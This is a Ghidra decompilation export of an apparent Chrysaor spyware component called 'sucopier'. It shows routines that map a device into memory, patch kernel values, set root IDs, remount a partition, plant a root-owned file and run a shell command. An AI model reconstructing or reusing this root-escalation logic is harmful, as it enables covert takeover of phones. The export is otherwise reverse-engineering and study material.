/* Decompiled stubs: sucopier */
/* Ghidra headless export - Chrysaor canonical sample */

/* === ioctl @ 00008944 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int ioctl(int __fd,ulong __request,...)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0000894c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb14)(__fd);
  return iVar1;
}


/* === munmap @ 00008950 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int munmap(void *__addr,size_t __len)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008958. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb18)(__addr);
  return iVar1;
}


/* === __errno @ 0000895c === */

void __errno(void)

{
                    /* WARNING: Could not recover jumptable at 0x00008964. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)PTR_LAB_0000bb1c)();
  return;
}


/* === __cxa_begin_cleanup @ 00008968 === */

void __cxa_begin_cleanup(void)

{
  (*(code *)PTR___cxa_begin_cleanup_0000bb20)();
  return;
}


/* === fgets @ 00008974 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * fgets(char *__s,int __n,FILE *__stream)

{
  char *pcVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0000897c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pcVar1 = (char *)(*(code *)PTR_LAB_0000bb24)(__s);
  return pcVar1;
}


/* === memcpy @ 00008980 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008988. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = (void *)(*(code *)PTR_LAB_0000bb28)(__dest);
  return pvVar1;
}


/* === readlink @ 0000898c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t readlink(char *__path,char *__buf,size_t __len)

{
  ssize_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008994. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = (*(code *)PTR_LAB_0000bb2c)(__path);
  return sVar1;
}


/* === getuid @ 00008998 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__uid_t getuid(void)

{
  __uid_t _Var1;
  
                    /* WARNING: Could not recover jumptable at 0x000089a0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _Var1 = (*(code *)PTR_LAB_0000bb30)();
  return _Var1;
}


/* === system @ 000089a4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int system(char *__command)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000089ac. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb34)(__command);
  return iVar1;
}


/* === sleep @ 000089b0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

uint sleep(uint __seconds)

{
  uint uVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000089b8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar1 = (*(code *)PTR_LAB_0000bb38)(__seconds);
  return uVar1;
}


/* === strtoul @ 000089bc === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ulong strtoul(char *__nptr,char **__endptr,int __base)

{
  ulong uVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000089c4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar1 = (*(code *)PTR_LAB_0000bb3c)(__nptr);
  return uVar1;
}


/* === chown @ 000089c8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int chown(char *__file,__uid_t __owner,__gid_t __group)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000089d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb40)(__file);
  return iVar1;
}


/* === mmap @ 000089d4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * mmap(void *__addr,size_t __len,int __prot,int __flags,int __fd,__off_t __offset)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000089dc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = (void *)(*(code *)PTR_LAB_0000bb44)(__addr);
  return pvVar1;
}


/* === abort @ 000089e0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void abort(void)

{
                    /* WARNING: Could not recover jumptable at 0x000089e8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)PTR_LAB_0000bb48)();
  return;
}


/* === __stack_chk_fail @ 000089ec === */

void __stack_chk_fail(void)

{
                    /* WARNING: Could not recover jumptable at 0x000089f4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)PTR_LAB_0000bb4c)();
  return;
}


/* === chmod @ 000089f8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int chmod(char *__file,__mode_t __mode)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a00. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb50)(__file);
  return iVar1;
}


/* === __libc_init @ 00008a04 === */

void __libc_init(void)

{
                    /* WARNING: Could not recover jumptable at 0x00008a0c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)PTR_LAB_0000bb54)();
  return;
}


/* === write @ 00008a10 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t write(int __fd,void *__buf,size_t __n)

{
  ssize_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a18. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = (*(code *)PTR_LAB_0000bb58)(__fd);
  return sVar1;
}


/* === strstr @ 00008a1c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strstr(char *__haystack,char *__needle)

{
  char *pcVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a24. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pcVar1 = (char *)(*(code *)PTR_LAB_0000bb5c)(__haystack);
  return pcVar1;
}


/* === read @ 00008a28 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
  ssize_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a30. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = (*(code *)PTR_LAB_0000bb60)(__fd);
  return sVar1;
}


/* === strncmp @ 00008a34 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int strncmp(char *__s1,char *__s2,size_t __n)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a3c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb64)(__s1);
  return iVar1;
}


/* === __cxa_type_match @ 00008a40 === */

void __cxa_type_match(void)

{
  (*(code *)PTR___cxa_type_match_0000bb68)();
  return;
}


/* === strtok @ 00008a4c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strtok(char *__s,char *__delim)

{
  char *pcVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a54. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pcVar1 = (char *)(*(code *)PTR_LAB_0000bb6c)(__s);
  return pcVar1;
}


/* === setresuid @ 00008a58 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int setresuid(__uid_t __ruid,__uid_t __euid,__uid_t __suid)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a60. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb70)(__ruid);
  return iVar1;
}


/* === fopen @ 00008a64 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fopen(char *__filename,char *__modes)

{
  FILE *pFVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a6c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pFVar1 = (FILE *)(*(code *)PTR_LAB_0000bb74)(__filename);
  return pFVar1;
}


/* === memset @ 00008a70 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memset(void *__s,int __c,size_t __n)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a78. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = (void *)(*(code *)PTR_LAB_0000bb78)(__s);
  return pvVar1;
}


/* === fclose @ 00008a7c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fclose(FILE *__stream)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a84. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb7c)(__stream);
  return iVar1;
}


/* === mount @ 00008a88 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mount(char *__special_file,char *__dir,char *__fstype,ulong __rwflag,void *__data)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008a90. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb80)(__special_file);
  return iVar1;
}


/* === __gnu_Unwind_Find_exidx @ 00008a94 === */

void __gnu_Unwind_Find_exidx(void)

{
  (*(code *)PTR___gnu_Unwind_Find_exidx_0000bb84)();
  return;
}


/* === sprintf @ 00008aa0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sprintf(char *__s,char *__format,...)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008aa8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb88)(__s);
  return iVar1;
}


/* === msync @ 00008aac === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int msync(void *__addr,size_t __len,int __flags)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008ab4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb8c)(__addr);
  return iVar1;
}


/* === open @ 00008ab8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int open(char *__file,int __oflag,...)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008ac0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb90)(__file);
  return iVar1;
}


/* === close @ 00008ac4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x00008acc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = (*(code *)PTR_LAB_0000bb94)(__fd);
  return iVar1;
}


/* === entry @ 00008ad0 === */

void processEntry entry(void)

{
  __libc_init();
  return;
}


/* === FUN_00008b00 @ 00008b00 === */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_00008b00(int *param_1)

{
  int *piVar1;
  
  piVar1 = param_1 + 1;
  if (*param_1 == s__pK__c__s_00008b28._0_4_) goto LAB_00008b1a;
  do {
    do {
      param_1 = piVar1;
      piVar1 = param_1 + 1;
    } while (*param_1 != s__pK__c__s_00008b28._0_4_);
LAB_00008b1a:
  } while ((param_1[1] != s__pK__c__s_00008b28._4_4_) || (piVar1[1] != ram0x00008b30));
  return;
}


/* === FUN_00008b40 @ 00008b40 === */

void FUN_00008b40(char *param_1)

{
  int iVar1;
  int iVar2;
  FILE *__stream;
  char *pcVar3;
  ulong uVar4;
  int iVar5;
  char *__delim;
  int iVar6;
  
  iVar2 = DAT_00008bfc;
  iVar1 = DAT_00008bf8;
  iVar6 = DAT_00008bf4 + 0x8b58;
  *(undefined4 *)(&stack0x000001e0 + DAT_00008bfc) = **(undefined4 **)(iVar6 + DAT_00008bf8);
  __stream = fopen((char *)(DAT_00008c04 + 0x8b6c),(char *)(DAT_00008c00 + 0x8b6e));
  __delim = (char *)(DAT_00008c08 + 0x8b7e);
  do {
    do {
      do {
        pcVar3 = fgets(&stack0xffffffe0 + iVar2,0x200,__stream);
        pcVar3 = strtok(pcVar3,__delim);
        uVar4 = strtoul(pcVar3,(char **)0x0,0x10);
      } while (pcVar3 == (char *)0x0);
      pcVar3 = strtok((char *)0x0,__delim);
    } while (pcVar3 == (char *)0x0);
    pcVar3 = strtok((char *)0x0,__delim);
    iVar5 = strncmp(param_1,pcVar3,0xe);
  } while (iVar5 != 0);
  fclose(__stream);
  if (uVar4 == 0) {
    uVar4 = 0xffffffff;
  }
  if (*(int *)(&stack0x000001e0 + iVar2) == **(int **)(iVar6 + iVar1)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar4);
}


/* === FUN_00008c0c @ 00008c0c === */

undefined4 FUN_00008c0c(int param_1)

{
  int __fd;
  int iVar1;
  void *__addr;
  undefined4 uVar2;
  int *piVar3;
  int *piVar4;
  void *pvVar6;
  int iVar7;
  undefined4 *puVar8;
  int *piVar5;
  
  __fd = open(*(char **)(param_1 + 4),2);
  if (__fd == -1) {
    return 0xffffffff;
  }
  *(int *)(param_1 + 8) = __fd;
  iVar1 = (**(code **)(param_1 + 0x2c))(param_1);
  if ((iVar1 == -1) ||
     (__addr = mmap((void *)0x0,*(size_t *)(param_1 + 0x18),3,1,*(int *)(param_1 + 8),
                    *(__off_t *)(param_1 + 0x14)), __addr == (void *)0xffffffff)) {
    close(__fd);
    return 0xffffffff;
  }
  pvVar6 = __addr;
  if (*(int *)(param_1 + 0x1c) != 0) {
    pvVar6 = (void *)(*(int *)(param_1 + 0x1c) * 4 + (int)__addr);
  }
  iVar7 = DAT_00008d44 + 0x8c62;
  iVar1 = FUN_00008b40(iVar7);
  puVar8 = (undefined4 *)0x0;
  if (iVar1 == -1) {
    puVar8 = (undefined4 *)FUN_00008b00(pvVar6);
    if (puVar8 != (undefined4 *)0x0) {
      *puVar8 = DAT_00008d54;
      sleep(4);
      iVar1 = FUN_00008b40(iVar7);
      if (iVar1 != -1) goto LAB_00008c72;
      *puVar8 = DAT_00008d4c;
    }
    uVar2 = 0xffffffff;
    close(__fd);
  }
  else {
LAB_00008c72:
    piVar3 = (int *)((iVar1 + 0x40000000 >> 2) * 4 + (int)pvVar6);
    piVar4 = piVar3;
    do {
      piVar5 = piVar4 + 1;
      if (*piVar4 == DAT_00008d48) break;
      piVar4 = piVar5;
    } while (piVar5 != piVar3 + 0x80);
    if (puVar8 != (undefined4 *)0x0) {
      *puVar8 = DAT_00008d4c;
    }
    *piVar4 = DAT_00008d50;
    (**(code **)(param_1 + 0x30))(param_1);
    sleep(2);
    setresuid(0,0,0);
    setresuid(0,0,0);
    *piVar4 = DAT_00008d48;
    (**(code **)(param_1 + 0x30))(param_1);
    sleep(2);
    msync(__addr,*(size_t *)(param_1 + 0x14),4);
    munmap(__addr,*(size_t *)(param_1 + 0x14));
    uVar2 = 0;
  }
  return uVar2;
}


/* === FUN_00008d58 @ 00008d58 === */

undefined4 FUN_00008d58(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *(int *)(DAT_00008d7c + 0x8d60);
  iVar3 = iVar2 + 0x138;
  do {
    iVar1 = FUN_00008c0c(iVar2);
    if (iVar1 == 0) {
      return 0;
    }
    iVar2 = iVar2 + 0x34;
  } while (iVar2 != iVar3);
  return 0xffffffff;
}


/* === FUN_00008d80 @ 00008d80 === */

void FUN_00008d80(int param_1)

{
  ioctl(*(int *)(param_1 + 8),DAT_00008d98,*(undefined4 *)(param_1 + 0x1c),
        *(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x1c),
        *(undefined4 *)(param_1 + 0x18));
  return;
}


/* === FUN_00008f8c @ 00008f8c === */

void FUN_00008f8c(char *param_1,char *param_2)

{
  undefined1 *__buf;
  int iVar1;
  int iVar2;
  int __fd;
  int iVar3;
  size_t __n;
  int iVar4;
  int *piVar5;
  undefined4 *puVar6;
  undefined4 uVar7;
  undefined1 *__buf_00;
  int iVar8;
  
  iVar2 = DAT_00009084;
  iVar1 = DAT_00009080;
  iVar8 = DAT_0000907c + 0x8fa2;
  *(undefined4 *)(&stack0xffffffe0 + DAT_00009088 + DAT_00009080) =
       **(undefined4 **)(iVar8 + DAT_00009084);
  __fd = open(param_1,0);
  if (-1 < __fd) {
    iVar3 = open(param_2,0xc1,0x1b6);
    __buf = &stack0xffffffe4 + iVar1;
    if (iVar3 < 0) {
LAB_00009068:
      puVar6 = (undefined4 *)__errno();
      uVar7 = *puVar6;
      close(__fd);
    }
    else {
LAB_00008fd4:
      __n = read(__fd,__buf,0x1000);
      if (0 < (int)__n) {
        iVar4 = write(iVar3,__buf,__n);
        __buf_00 = __buf;
        if (iVar4 < 0) goto LAB_0000900a;
        do {
          __n = __n - iVar4;
          __buf_00 = __buf_00 + iVar4;
          while( true ) {
            if ((int)__n < 1) goto LAB_00008fd4;
            iVar4 = write(iVar3,__buf_00,__n);
            if (-1 < iVar4) break;
LAB_0000900a:
            piVar5 = (int *)__errno();
            if (*piVar5 != 4) goto LAB_00009014;
          }
        } while( true );
      }
      if (__n == 0) {
        iVar3 = close(iVar3);
        if (-1 < iVar3) {
          close(__fd);
          uVar7 = 0;
          goto LAB_00009030;
        }
        goto LAB_00009068;
      }
LAB_00009014:
      puVar6 = (undefined4 *)__errno();
      uVar7 = *puVar6;
      close(__fd);
      close(iVar3);
    }
    puVar6 = (undefined4 *)__errno();
    *puVar6 = uVar7;
  }
  uVar7 = 0xffffffff;
LAB_00009030:
  if (*(int *)(&stack0xffffffe0 + DAT_00009088 + iVar1) == **(int **)(iVar8 + iVar2)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar7);
}


/* === FUN_00009090 @ 00009090 === */

void FUN_00009090(int param_1)

{
  if (param_1 == 0) {
    mount((char *)(DAT_000090d4 + 0x90a8),(char *)(DAT_000090d8 + 0x90aa),
          (char *)(DAT_000090dc + 0x90ac),DAT_000090e0,(void *)(DAT_000090d0 + 0x90a4));
  }
  else {
    mount((char *)(DAT_000090e8 + 0x90ca),(char *)(DAT_000090ec + 0x90c4),
          (char *)(DAT_000090f0 + 0x90c6),DAT_000090f4,(void *)(DAT_000090e4 + 0x90c0));
  }
  return;
}


/* === FUN_000090f8 @ 000090f8 === */

void FUN_000090f8(undefined4 param_1,char *param_2)

{
  int iVar1;
  int iVar2;
  ssize_t sVar3;
  __uid_t _Var4;
  int iVar5;
  undefined4 uVar6;
  int iVar7;
  char *__buf;
  undefined4 *puVar8;
  
  iVar2 = DAT_00009200;
  iVar1 = DAT_000091fc;
  puVar8 = (undefined4 *)(&stack0xffffffe0 + DAT_000091fc);
  iVar7 = DAT_00009204 + 0x9114;
  __buf = &stack0xffffffe0 + DAT_0000920c + DAT_000091fc;
  *(undefined4 *)(&stack0xffffffe0 + DAT_00009208 + DAT_000091fc) =
       **(undefined4 **)(iVar7 + DAT_00009200);
  getuid();
  memset(__buf,0,0x400);
  sVar3 = readlink((char *)(DAT_00009210 + 0x9138),__buf,DAT_00009214);
  if (sVar3 != -1) {
    _Var4 = getuid();
    if (_Var4 == 0) {
      iVar5 = FUN_00009090(1);
      if (iVar5 != -1) {
        iVar5 = FUN_00008f8c(param_1,param_2);
        if (((iVar5 == 0) && (iVar5 = chown(param_2,0,0), iVar5 == 0)) &&
           (iVar5 = chmod(param_2,DAT_00009218), iVar5 == 0)) {
          FUN_00009090(0);
          sleep(10);
          uVar6 = 0;
        }
        else {
          FUN_00009090(0);
          uVar6 = 0xffffffff;
        }
        goto LAB_00009164;
      }
    }
    else {
      iVar5 = FUN_00008d58();
      _Var4 = getuid();
      setresuid(0,0,0);
      if ((_Var4 == 0) && (iVar5 == 0)) {
        *puVar8 = param_2;
        sprintf(&stack0xffffffec + iVar1,(char *)(DAT_0000921c + 0x91d2),__buf,param_1);
        iVar5 = system(&stack0xffffffec + iVar1);
        uVar6 = 0;
        if (iVar5 == 0) goto LAB_00009164;
      }
    }
  }
  uVar6 = 0xffffffff;
LAB_00009164:
  if (*(int *)(&stack0xffffffe0 + DAT_00009208 + iVar1) != **(int **)(iVar7 + iVar2)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar6);
  }
  return;
}


/* === FUN_00009238 @ 00009238 === */

undefined4 FUN_00009238(int param_1,uint param_2,uint param_3,int param_4,undefined4 *param_5)

{
  bool bVar1;
  
  if (param_2 == 0) {
    bVar1 = param_3 == 0xf;
    if (param_3 < 0x10) {
      bVar1 = param_4 == 0;
    }
    if (bVar1) {
      *param_5 = *(undefined4 *)(param_1 + param_3 * 4 + 4);
      return 0;
    }
  }
  else if (param_2 < 5) {
    return 1;
  }
  return 2;
}


/* === FUN_00009284 @ 00009284 === */

undefined4 FUN_00009284(int param_1,uint param_2,uint param_3,int param_4,undefined4 *param_5)

{
  bool bVar1;
  
  if (param_2 == 0) {
    bVar1 = param_3 == 0xf;
    if (param_3 < 0x10) {
      bVar1 = param_4 == 0;
    }
    if (bVar1) {
      *(undefined4 *)(param_1 + param_3 * 4 + 4) = *param_5;
      return 0;
    }
  }
  else if (param_2 < 5) {
    return 1;
  }
  return 2;
}


/* === FUN_000092d0 @ 000092d0 === */

int FUN_000092d0(uint *param_1)

{
  uint uVar1;
  
  uVar1 = *param_1;
  if ((uVar1 & 0x40000000) == 0) {
    uVar1 = uVar1 & 0x7fffffff;
  }
  else {
    uVar1 = uVar1 | 0x80000000;
  }
  return (int)param_1 + uVar1;
}


/* === __aeabi_unwind_cpp_pr2 @ 000097a8 === */

/* WARNING: Removing unreachable block (ram,0x00009348) */
/* WARNING: Removing unreachable block (ram,0x000093c4) */
/* WARNING: Removing unreachable block (ram,0x000093e4) */

undefined4 __aeabi_unwind_cpp_pr2(uint param_1,uint param_2,undefined4 param_3)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  uint uVar5;
  uint *puVar6;
  uint *puVar7;
  uint uVar8;
  uint *puVar9;
  uint uVar10;
  bool bVar11;
  uint uVar12;
  uint uStack_58;
  int iStack_3c;
  uint *puStack_38;
  undefined1 uStack_34;
  undefined1 uStack_33;
  uint uStack_30;
  int aiStack_2c [2];
  
  uVar8 = param_1 & 3;
  puStack_38 = *(uint **)(param_2 + 0x4c) + 1;
  uVar5 = **(uint **)(param_2 + 0x4c);
  iStack_3c = uVar5 << 0x10;
  puVar9 = puStack_38 + (uVar5 >> 0x10 & 0xff);
  uStack_34 = 2;
  uStack_33 = (undefined1)(uVar5 >> 0x10);
  if (uVar8 == 2) {
    puVar9 = *(uint **)(param_2 + 0x38);
  }
  if ((*(uint *)(param_2 + 0x50) & 1) == 0) {
    iVar3 = param_2 + 0x58;
    bVar11 = false;
LAB_0000970c:
    do {
      while( true ) {
        uVar5 = *puVar9;
        if (uVar5 == 0) goto LAB_00009718;
        uVar10 = puVar9[1];
        puVar7 = puVar9 + 2;
        uVar12 = (uVar10 & 0xfffffffe) + *(int *)(param_2 + 0x48);
        FUN_00009238(param_3,0,0xf,0,&uStack_30);
        if (uStack_30 < uVar12) {
          bVar1 = false;
        }
        else if (uStack_30 < uVar12 + (uVar5 & 0xfffffffe)) {
          bVar1 = true;
        }
        else {
          bVar1 = false;
        }
        uVar5 = uVar5 & 1 | (uVar10 & 1) << 1;
        if (uVar5 != 1) break;
        if (uVar8 == 0) {
          if (bVar1) {
            uVar5 = puVar9[3];
            if (uVar5 == 0xfffffffe) {
              return 9;
            }
            aiStack_2c[0] = iVar3;
            if (uVar5 != 0xffffffff) {
              if (uVar5 == 0) {
                uVar4 = 0;
              }
              else {
                uVar4 = *(undefined4 *)((int)puVar9 + uVar5 + 0xc);
              }
              iVar2 = __cxa_type_match(param_2,uVar4,*puVar7 >> 0x1f,aiStack_2c);
              if (iVar2 == 0) {
                aiStack_2c[0] = 0;
              }
            }
            if (aiStack_2c[0] != 0) {
LAB_0000960c:
              FUN_00009238(param_3,0,0xd,0,&uStack_30);
              *(uint **)(param_2 + 0x28) = puVar7;
              *(uint *)(param_2 + 0x20) = uStack_30;
              *(int *)(param_2 + 0x24) = aiStack_2c[0];
              return 6;
            }
          }
        }
        else {
          uVar5 = *(uint *)(param_2 + 0x20);
          FUN_00009238(param_3,0,0xd,0,&uStack_30);
          if ((uVar5 == uStack_30) && (puVar7 == *(uint **)(param_2 + 0x28))) {
            uStack_30 = FUN_000092d0(puVar7);
            FUN_00009284(param_3,0,0xf,0,&uStack_30);
LAB_000096d0:
            uVar4 = 0;
            uStack_30 = param_2;
            goto LAB_0000978c;
          }
        }
        puVar9 = puVar9 + 4;
      }
      if (uVar5 != 0) {
        if (uVar5 != 2) {
          return 9;
        }
        uVar5 = *puVar7 & 0x7fffffff;
        if (uVar8 == 0) {
          if ((bVar1) && ((param_1 & 8) == 0 || uVar5 == 0)) {
            uStack_58 = 0;
            puVar6 = puVar7;
            do {
              if (uStack_58 == uVar5) goto LAB_0000960c;
              puVar6 = puVar6 + 1;
              uStack_58 = uStack_58 + 1;
              uVar4 = 0;
              if (*puVar6 != 0) {
                uVar4 = *(undefined4 *)((int)puVar6 + *puVar6);
              }
              aiStack_2c[0] = iVar3;
              iVar2 = __cxa_type_match(param_2,uVar4,0,aiStack_2c);
            } while (iVar2 == 0);
          }
        }
        else {
          uVar10 = *(uint *)(param_2 + 0x20);
          FUN_00009238(param_3,0,0xd,0,&uStack_30);
          if ((uVar10 == uStack_30) && (puVar7 == *(uint **)(param_2 + 0x28))) {
            *(uint **)(param_2 + 0x34) = puVar9 + 3;
            *(uint *)(param_2 + 0x28) = uVar5;
            *(undefined4 *)(param_2 + 0x2c) = 0;
            *(undefined4 *)(param_2 + 0x30) = 4;
            if (-1 < (int)*puVar7) {
              uStack_30 = FUN_000092d0(puVar7 + uVar5 + 1);
              FUN_00009284(param_3,0,0xf,0,&uStack_30);
              goto LAB_000096d0;
            }
            bVar11 = true;
          }
        }
        if ((int)*puVar7 < 0) {
          puVar7 = puVar9 + 3;
        }
        puVar9 = puVar7 + uVar5 + 1;
        goto LAB_0000970c;
      }
      if (uVar8 == 0) {
        bVar1 = false;
      }
      puVar9 = puVar9 + 3;
    } while (!bVar1);
    uVar5 = FUN_000092d0(puVar7);
    *(uint **)(param_2 + 0x38) = puVar9;
    iVar3 = __cxa_begin_cleanup(param_2);
    if (iVar3 != 0) {
      uVar4 = 0xf;
      uStack_30 = uVar5;
      goto LAB_0000978c;
    }
  }
  else {
    bVar11 = false;
LAB_00009718:
    iVar3 = FUN_0000a370(param_3,&iStack_3c);
    if (iVar3 == 0) {
      if (!bVar11) {
        return 8;
      }
      FUN_00009238(param_3,0,0xf,0,&uStack_30);
      FUN_00009284(param_3,0,0xe,0,&uStack_30);
      uVar4 = 0xf;
      uStack_30 = *(uint *)(DAT_000097a4 + 0x977c);
LAB_0000978c:
      FUN_00009284(param_3,0,uVar4,0,&uStack_30);
      return 7;
    }
  }
  return 9;
}


/* === __aeabi_unwind_cpp_pr1 @ 000097b0 === */

/* WARNING: Removing unreachable block (ram,0x00009348) */
/* WARNING: Removing unreachable block (ram,0x000093c8) */
/* WARNING: Removing unreachable block (ram,0x000093e0) */

undefined4 __aeabi_unwind_cpp_pr1(uint param_1,uint param_2,undefined4 param_3)

{
  ushort uVar1;
  bool bVar2;
  int iVar3;
  int iVar4;
  undefined4 uVar5;
  uint uVar6;
  uint *puVar7;
  uint *puVar8;
  uint uVar9;
  uint *puVar10;
  bool bVar11;
  uint uVar12;
  uint uStack_58;
  int iStack_3c;
  uint *puStack_38;
  undefined1 uStack_34;
  undefined1 uStack_33;
  uint uStack_30;
  int aiStack_2c [2];
  
  uVar9 = param_1 & 3;
  puStack_38 = *(uint **)(param_2 + 0x4c) + 1;
  uVar6 = **(uint **)(param_2 + 0x4c);
  iStack_3c = uVar6 << 0x10;
  puVar10 = puStack_38 + (uVar6 >> 0x10 & 0xff);
  uStack_34 = 2;
  uStack_33 = (undefined1)(uVar6 >> 0x10);
  if (uVar9 == 2) {
    puVar10 = *(uint **)(param_2 + 0x38);
  }
  if ((*(uint *)(param_2 + 0x50) & 1) == 0) {
    iVar4 = param_2 + 0x58;
    bVar11 = false;
LAB_0000970c:
    do {
      while( true ) {
        if (*puVar10 == 0) goto LAB_00009718;
        uVar1 = *(ushort *)((int)puVar10 + 2);
        uVar6 = *puVar10;
        puVar8 = puVar10 + 1;
        uVar12 = (uVar1 & 0xfffffffe) + *(int *)(param_2 + 0x48);
        FUN_00009238(param_3,0,0xf,0,&uStack_30);
        if (uStack_30 < uVar12) {
          bVar2 = false;
        }
        else if (uStack_30 < uVar12 + ((ushort)uVar6 & 0xfffffffe)) {
          bVar2 = true;
        }
        else {
          bVar2 = false;
        }
        uVar6 = (ushort)uVar6 & 1 | (uVar1 & 1) << 1;
        if (uVar6 != 1) break;
        if (uVar9 == 0) {
          if (bVar2) {
            uVar6 = puVar10[2];
            if (uVar6 == 0xfffffffe) {
              return 9;
            }
            aiStack_2c[0] = iVar4;
            if (uVar6 != 0xffffffff) {
              if (uVar6 == 0) {
                uVar5 = 0;
              }
              else {
                uVar5 = *(undefined4 *)((int)puVar10 + uVar6 + 8);
              }
              iVar3 = __cxa_type_match(param_2,uVar5,*puVar8 >> 0x1f,aiStack_2c);
              if (iVar3 == 0) {
                aiStack_2c[0] = 0;
              }
            }
            if (aiStack_2c[0] != 0) {
LAB_0000960c:
              FUN_00009238(param_3,0,0xd,0,&uStack_30);
              *(uint **)(param_2 + 0x28) = puVar8;
              *(uint *)(param_2 + 0x20) = uStack_30;
              *(int *)(param_2 + 0x24) = aiStack_2c[0];
